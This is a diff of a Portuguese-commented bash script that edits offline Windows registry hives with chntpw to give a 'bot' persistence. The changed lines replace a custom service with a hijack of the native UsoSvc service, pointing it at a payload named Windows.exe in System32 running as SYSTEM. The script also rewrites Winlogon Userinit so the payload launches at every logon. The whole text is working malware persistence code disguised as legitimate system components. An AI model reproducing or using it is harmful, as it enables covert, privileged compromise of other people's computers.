@@ -53,10 +53,14 @@ printf "cd Microsoft\\\\Windows\\\\CurrentVersion\\\\ImmersiveShell\nnv 4 UseAct
 
 # 6. PERSISTÊNCIA SYSTEM (O Coração do Bot)
 echo "[*] Criando Serviço SYSTEM via 'nk'..."
-# Navega passo a passo para evitar erro de 'Key not found'
-printf "cd ControlSet001\ncd Services\nnk WinInternalSvc\ncd WinInternalSvc\nnv 4 Start\n ed Start\n 2 \n nv 4 Type\n ed Type \n 16\n nv 1 ImagePath \n ed ImagePath \n$PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
+# --- O MELHOR DOS DOIS MUNDOS ---
+
+# 6.1. GARANTIR SYSTEM (Serviço Nativo)
+echo "[*] Configurando Instância SYSTEM (UsoSvc)..."
+printf "cd ControlSet001\\\\Services\\\\UsoSvc\ned ImagePath\nC:\\\\Windows\\\\System32\\\\Windows.exe\nnv 4 Start\ned Start\n2\nq\ny\n" | sudo chntpw -e "$SYSTEM" &>/dev/null
 
 # Userinit como redundância
+echo "[*] Usando a persistencia via (UserUnit)..."
 printf "cd Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\ned Userinit\nC:\\\\Windows\\\\system32\\\\userinit.exe,cmd /c start $PAYLOAD_PATH\nq\ny\n" | sudo chntpw -e "$SOFTWARE" &>/dev/null
 
 # 7. DEPLOY FINAL NA SYSTEM32
